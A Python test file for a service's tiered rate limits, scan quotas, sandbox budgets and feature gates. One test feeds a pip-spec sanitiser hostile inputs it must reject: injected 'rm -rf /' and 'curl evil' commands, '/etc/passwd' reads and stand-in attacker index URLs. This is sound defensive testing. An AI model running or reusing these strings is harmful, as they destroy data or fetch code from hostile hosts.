"""Tiered rate limits, quotas, and feature gates (core/limits.py). These are the admission-control guards
that make PRICING.md real: meter the expensive thing (deep-verify scans, sandbox-minutes), keep discovery
generous, fail closed. Deterministic via an injected clock — no real sleeping."""
import os
import sys

_SPIKE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _SPIKE)

from core import limits as L  # noqa: E402


class _Clock:
    def __init__(self, t=1_700_000_000.0):
        self.t = t

    def __call__(self):
        return self.t

    def advance(self, s):
        self.t += s


def test_resolve_tier_defaults_closed():
    assert L.resolve_tier("free").name == "free"
    assert L.resolve_tier("pro").name == "pro"
    assert L.resolve_tier("enterprise").name == "enterprise"
    # unknown / missing identity → the restrictive default, never an open tier
    assert L.resolve_tier("platinum").name == L._DEFAULT_TIER
    assert L.resolve_tier(None).name == L._DEFAULT_TIER


def test_api_rate_limit_blocks_burst_and_resets_next_window():
    clk = _Clock()
    lim = L.Limiter(clock=clk)
    free = L.resolve_tier("free")
    # free = 30 rpm by default: the first 30 pass, the 31st is refused with a Retry-After
    for _ in range(free.api_rpm):
        assert lim.check_api_rate("t1", free).ok
    d = lim.check_api_rate("t1", free)
    assert not d.ok and d.status == 429 and d.retry_after and d.retry_after >= 1
    # a different tenant is independent
    assert lim.check_api_rate("t2", free).ok
    # next minute window resets
    clk.advance(61)
    assert lim.check_api_rate("t1", free).ok


def test_daily_scan_quota_fail_closed_then_resets_at_midnight():
    clk = _Clock()
    lim = L.Limiter(clock=clk)
    free = L.resolve_tier("free")
    for _ in range(free.deep_verify_per_day):
        d = lim.admit_scan("t1", free)
        assert d.ok
        lim.release_slot("t1")
    d = lim.admit_scan("t1", free)
    assert not d.ok and d.status == 429 and d.retry_after > 0
    # next UTC day → quota resets
    clk.advance(24 * 3600)
    assert lim.admit_scan("t1", free).ok


def test_sandbox_minute_budget_exhaustion_blocks_402():
    clk = _Clock()
    lim = L.Limiter(clock=clk)
    free = L.resolve_tier("free")
    # burn the whole monthly sandbox budget
    lim.record_sandbox_seconds("t1", free.sandbox_minutes_per_month * 60)
    d = lim.admit_scan("t1", free)
    assert not d.ok and d.status == 402


def test_concurrency_slot_reservation_and_release():
    lim = L.Limiter(clock=_Clock())
    free = L.resolve_tier("free")   # concurrency = 1
    assert lim.admit_scan("t1", free).ok       # slot taken
    d = lim.admit_scan("t1", free)             # second in-flight refused
    assert not d.ok and d.status == 429
    lim.release_slot("t1")
    assert lim.admit_scan("t1", free).ok        # slot freed


def test_owner_tier_is_unmetered():
    lim = L.Limiter(clock=_Clock())
    owner = L.resolve_tier("owner")
    assert owner.unmetered
    for _ in range(50):
        assert lim.check_api_rate("op", owner).ok
        assert lim.admit_scan("op", owner).ok


def test_clamp_k_and_wall_to_tier():
    free = L.resolve_tier("free")
    out, d = L.clamp_request(free, {"k": 25, "deep": True})
    assert d.ok
    assert out["k"] == free.max_k
    assert out["timeout"] == free.wall_seconds
    assert out["top_k"] == free.top_k_claims


def test_gate_private_repos_and_fetch_data_on_free():
    free = L.resolve_tier("free")
    _, d = L.clamp_request(free, {"installation_id": "123"})
    assert not d.ok and d.status == 402
    _, d2 = L.clamp_request(free, {"fetch_data": True})
    assert not d2.ok and d2.status == 402


def test_pro_allows_private_and_higher_k():
    pro = L.resolve_tier("pro")
    out, d = L.clamp_request(pro, {"installation_id": "123", "k": 8})
    assert d.ok and out["k"] == 8      # 8 <= pro max_k(10), untouched
    out2, d2 = L.clamp_request(pro, {"k": 50})
    assert out2["k"] == pro.max_k       # clamped down


def test_unfoolability_and_repair_disabled_on_free():
    free = L.resolve_tier("free")
    out, d = L.clamp_request(free, {"fuzz": True, "repair": True})
    assert d.ok                          # soft-disabled, not refused
    assert out["fuzz"] is False and out["repair"] is False


def test_sanitize_pip_rejects_flags_urls_and_paths():
    bad = ["--index-url", "--index-url=http://evil/simple", "-r/etc/passwd", "git+https://evil/x",
           "http://evil/pkg.whl", "/etc/passwd", "pkg; rm -rf /", "a b", "pkg && curl evil", "", "x" * 200,
           ".", "..", "-e ."]
    assert L.sanitize_pip(bad) == []


def test_sanitize_pip_keeps_plain_specs_and_dedups():
    good = ["numpy", "scikit-learn==1.3.0", "pandas>=1.5", "torch", "uvicorn[standard]", "numpy"]
    out = L.sanitize_pip(good)
    assert out == ["numpy", "scikit-learn==1.3.0", "pandas>=1.5", "torch", "uvicorn[standard]"]


def test_usage_snapshot_reports_meters():
    clk = _Clock()
    lim = L.Limiter(clock=clk)
    free = L.resolve_tier("free")
    lim.admit_scan("t1", free)
    lim.record_sandbox_seconds("t1", 120)
    u = lim.usage("t1", free)
    assert u["scans_today"] == 1 and u["sandbox_minutes_used"] == 2.0 and u["inflight"] == 1
    assert u["scans_per_day"] == free.deep_verify_per_day
